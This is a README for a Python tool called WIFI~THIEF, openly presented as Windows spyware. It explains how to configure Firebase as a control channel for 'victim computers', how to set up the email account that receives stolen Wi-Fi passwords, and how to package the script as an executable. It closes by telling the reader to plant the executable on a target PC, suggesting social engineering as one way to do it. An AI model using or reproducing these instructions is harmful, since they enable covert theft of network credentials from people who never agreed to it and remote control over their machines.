# WIFI~THIEF
<img src="https://img.shields.io/badge/PYTHON-3.11-blue"> <img src="https://img.shields.io/badge/V-1.1.0-yellow"> <img src="https://img.shields.io/badge/license-GPL--3.0%20license-red">    <br>
<b><i>WIFI~THIEF (WIFI SPYWARE FOR WINDOWS)</b></i>

## INSTALL NECESSARY PACKAGE🔧
```
 pip install Pyrebase
  ```


## SETTING UP SPYWARE ⚙
line no 13
```
db_credi ={
    "apiKey": "",
    "authDomain": "",
    "projectId": "",
    "storageBucket": "",
    "messagingSenderId": "",
    "appId": "",
    "measurementId": "",
    "databaseURL":""
    } 
```
### DATABASE CONNECTIVITY (FIREBASE) 
We use firebase to handle your victim computers.. (The database backup json file is in the folder) 
Basically we have a run child and a device child .. 
### <u> runner </u>
runner child has a looping key and a running key <br>
looping key = If the looping key  is true, the spyware will run until you set the looping key to false <br>
runner = If driver is false, your spyware is not working and is in a dead (down) state <br>
##### TIPS 📜
If you want to run your spyware once, you need to set loop key to false and run key to true

### <u> device </u>
 device  child  helps manage your victims ...It is updated and edited by spyware<br>
 last date key = This will help you to know the last date your wifi key was updated


## SETTING UP EMAIL 📧
line no 64 & 65

This email setup is used to send the victim's wifi password to your email... If your victim internet connection is not live it will wait for it to reconnect and send you an update as soon as possible.
```
emaill = "your email"
passW = "app password"
```
## PY TO EXE ⚒

1. install auto-py-to-exe
```
pip install auto-py-to-exe
```
2. run auto-py-to-exe 
open cmd and type this
```
auto-py-to-exe
```
and select py file and click convert button

## attack ☠

You need to install this exe file to windows pc ... You can also use social engineering method
